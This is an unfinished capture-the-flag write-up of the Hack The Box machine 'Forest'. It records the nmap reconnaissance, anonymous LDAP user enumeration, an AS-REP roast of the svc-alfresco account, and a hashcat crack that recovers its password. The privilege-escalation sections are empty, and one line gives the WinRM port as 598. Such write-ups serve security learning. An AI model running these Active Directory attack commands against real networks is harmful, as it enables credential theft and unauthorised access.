---
target_ip: 10.10.10.161
platform: HTB
difficulty: Easy
os: Windows
date_started: 2025-06-14
status: in_progress
services: ['kpasswd5', 'microsoft-ds', 'msrpc', 'netbios-ssn', 'kerberos-sec', 'domain', 'ldap', 'ncacn_http', 'http', 'tcpwrapped']
techniques_used: []
tools_used: [nmap]
---

# Forest

**Platform:** HTB | **Difficulty:** Easy | **OS:** Windows | **Date:** 14/06/2025

## Summary

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.10.161 -oA nmap/forest
```

| Port | Service      | Version                                         |
| ---- | ------------ | ----------------------------------------------- |
| 53   | domain       | Simple DNS Plus                                 |
| 88   | kerberos-sec | Microsoft Windows Kerberos                      |
| 135  | msrpc        | Microsoft Windows RPC                           |
| 139  | netbios-ssn  | Microsoft Windows netbios-ssn                   |
| 389  | ldap         | Microsoft Windows Active Directory LDAP         |
| 445  | microsoft-ds | Windows Server 2016 Standard 14393 microsoft-ds |
| 464  | kpasswd5     | N/A                                             |
| 593  | ncacn_http   | Microsoft Windows RPC over HTTP 1.0             |
| 636  | tcpwrapped   | N/A                                             |
| 3268 | ldap         | Microsoft Windows Active Directory LDAP         |
| 3269 | tcpwrapped   | N/A                                             |
| 5985 | http         | Microsoft HTTPAPI httpd 2.0                     |

## Enumeration

Generated and appended a hosts file to `/etc/hosts` to avoid possible DNS issues later on with Kerberos.
```bash
nxc smb '10.10.10.161' --generate-hosts-file files/hosts && sudo tee -a /etc/hosts < files/hosts

tail -n 1 /etc/hosts
10.10.10.161     FOREST.htb.local FOREST
```

Enumerated the domain users.
```bash
nxc ldap 'FOREST' -u '' -p '' -d 'htb.local' --active-users | awk '{print $5}' | grep -v '^[H,\[,-]' > files/users.txt && cat files/users.txt 


Administrator
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

## Exploitation

Performed an AS-REP Roast attack on the list of users, to find a service account `svc-alfresco` with Kerberos pre-authentication disabled.
```bash
nxc ldap 'FOREST' -u files/users.txt  -p '' -d 'htb.local' --asreproast files/roast.txt     

...
LDAP        10.10.10.161    389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:d92213ff872a80624a412d802a52b446$...
```

I then cracked its AS-REP hash with `hashcat` to reveal its password `s3rvice`.
```bash
hashcat -m 18200 -a 0 files/roast.txt /usr/share/wordlists/rockyou.txt

...
$krb5asrep$23$svc-alfresco@HTB.LOCAL:b73c81fb8c33164c016884a6be75e669$2beb8c478e9b6f4b0b1ee2aeaba1821f22f189957bf8b9ee4f15f5ac1317a7c3678fd71f9fc0d926a3529dbfed42c26bf119bf475f96a38af3bdb1b0c6085cff57e63015e95b3fec76271c4736df2fb34c46edbca9614f05eee7e8c2c0e524aa2acd07de8a1b17feb7380c29ea75f86f328868bc893b9a36f41ba6f67ff3a02ff4ce1e2784868cc156b91ab5f5aa3a3f91e61fca6b61ab70dbd9e20a0f49a653078d638bf2588ad564c1c91d601cc07f7fc10b0e22f4b5803a0e8540eef8f2e1e9fd3e45525337b6ca0ef27788ae6ef610822c8e0147fd9b39919e8739a872ca3584d7658274:s3rvice
...
```

Discovered I could login to the service account via `winrm` on port `598`



## Privilege Escalation

### Enumeration

### Escalation

### Root Flag

## References

---
#forest #htb #easy #windows #netexec #asreproast #hashcat 
